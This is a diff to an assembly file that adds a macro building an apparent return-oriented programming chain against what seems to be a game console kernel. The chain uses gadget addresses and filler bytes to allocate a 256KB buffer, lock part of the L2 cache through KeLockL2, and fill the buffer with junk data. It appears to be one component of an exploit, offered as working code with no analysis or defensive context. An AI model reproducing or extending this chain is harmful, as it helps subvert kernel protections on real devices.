@@ -64,6 +64,57 @@
 .endm
 
 ###########################################################
+# void LOCK_AND_THRASH_L2(index, buffer_ptr_addr, base_addr, offset)
+#
+#   Allocates a buffer and uses it to lock a portion of the L2 cache.
+#
+###########################################################
+.macro LOCK_AND_THRASH_L2 index, buffer_ptr_addr, base_addr, offset
+
+    _lock_and_thrash_l2_base_addr = .
+
+        #
+        # 1. Allocate a 256KB buffer for the L2 thrashing.
+        #
+        CALL_FUNC 11, XPhysicalAlloc, R3H=0, R3L=0x40000, R4H=0, R4L=0xFFFFFFFF, R5H=0, R5L=0x40000, R6H=0, R6L=0x20000004
+        .fill   0x50, 1, 0x00
+        .long   0x00000000, \buffer_ptr_addr
+        .long   stw_r3
+        .long   0x00000000
+        .fill   0x50, 1, 0x00
+        .long   0x31313131, 0x31313131
+        .long   __restgprlr_31
+        .long   0x00000000
+
+        #
+        # 2. Reserve the L2 cache range.
+        #
+        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((2f + cf_r4_offset) - _lock_and_thrash_l2_base_addr), \buffer_ptr_addr
+        .if \index == 0
+            CALL_FUNC 2, KeLockL2, R3H=0, R3L=0, R4H=0, R4L=0x41414141, R5H=0, R5L=0x40000, R6H=0, R6L=3, R7H=0, R7L=3
+        .else
+            CALL_FUNC 2, KeLockL2, R3H=0, R3L=1, R4H=0, R4L=0x41414141, R5H=0, R5L=0x40000, R6H=0, R6L=12, R7H=0, R7L=12
+        .endif
+
+        #
+        # 3. Fill the buffer with trash data.
+        #
+        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((3f + cf_r3_offset) - _lock_and_thrash_l2_base_addr), \buffer_ptr_addr
+        CALL_FUNC 3, memset, R3H=0, R3L=0x41414141, R4H=0, R4L=0x41, R5H=0, R5L=0x40000
+
+        #
+        # 4. Commit the L2 cache lock.
+        #
+        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((4f + cf_r4_offset) - _lock_and_thrash_l2_base_addr), \buffer_ptr_addr
+        .if \index == 0
+            CALL_FUNC 4, KeLockL2, R3H=0, R3L=0, R4H=0, R4L=0x41414141, R5H=0, R5L=0x40000, R6H=0, R6L=0, R7H=0, R7L=3
+        .else
+            CALL_FUNC 4, KeLockL2, R3H=0, R3L=1, R4H=0, R4L=0x41414141, R5H=0, R5L=0x40000, R6H=0, R6L=0, R7H=0, R7L=12
+        .endif
+
+.endm
+
+###########################################################
 # void FREE_ENCRYPTED_ALLOCATION()
 #
 #   TODO
